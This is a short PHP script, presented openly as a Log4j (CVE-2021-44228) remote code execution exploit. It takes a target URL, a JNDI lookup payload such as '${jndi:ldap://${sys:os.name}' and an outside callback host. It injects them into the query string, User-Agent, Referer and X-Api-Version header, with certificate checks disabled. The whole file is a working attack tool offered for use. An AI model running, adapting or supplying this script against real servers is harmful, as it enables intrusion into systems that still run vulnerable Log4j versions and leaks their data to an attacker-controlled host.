<?php
/* 
    * LOG4J RCE Exploit (CVE-2021-44228)
    * Simple Exploit
    * Coded By 4LM05TH3V!L
    * Github : github.com/momos1337
    * Date 13 Dec 2021
    * Made With Love
    * Note : if u can use proxy enable this (remove slash)
    * curl_setopt($ch,CURLOPT_PROXY, $proxyIP);
    * curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
    
    * [+] Usage : php log4j.php site.com
*/
system("clear") or system("cls");
error_reporting(0);
//proxy if u can set
$proxyIP = '127.0.0.1';
$proxyPort = '8080';
//color
$red = "\e[31;1m";;
$white = "\e[1;37m";
echo "
   |\__/,|   (`\
   |o o  |__ _)     LOG4J RCE Exploit (CVE-2021-44228)
 _.( T   )  `  /    Coded By 4LM05TH3V!L
((_ `^--' /_<  \    Github : momos1337
`` `-'(((/  (((/
{$red}[+] {$white}Example Payload : "; echo '${jndi:ldap://${sys:os.name}';
echo "\n";
//check url
$url = $argv[1];
if ($url == null) {
	exit("{$red}[!] {$white}Usage: php log4j.php https://1337.com\n");
}
echo "\n{$red}[+]{$white} Enter Payload : ";
$payload = trim(fgets(STDIN));
echo "{$red}[+]{$white} Enter Collab Log  : ";
$collab = trim(fgets(STDIN));
echo "\nExploiting: ";
echo "\n{$red}[+]{$white} Target : $url";
echo "\n{$red}[+]{$white} Payload : $payload";
echo "\n{$red}[+]{$white} DNS Log : $collab\n";
$headers = ["X-Api-Version: $payload.$collab/a"];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "$url?id=$payload.$collab/a"); 
    curl_setopt($ch, CURLOPT_USERAGENT, "$payload.$collab/a");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_REFERER, "$payload.$collab/a");
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL , 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    //curl_setopt($ch, CURLOPT_PROXY, $proxyIP); //if u can set
    //curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort); //if u can set
    curl_exec($ch);
if(curl_errno($ch)){
    echo "\n{$red}[!] {$white}Please Connect Your Proxy Burpsuite\n";
    throw new Exception(curl_error($ch));
}
curl_close($ch);
?>
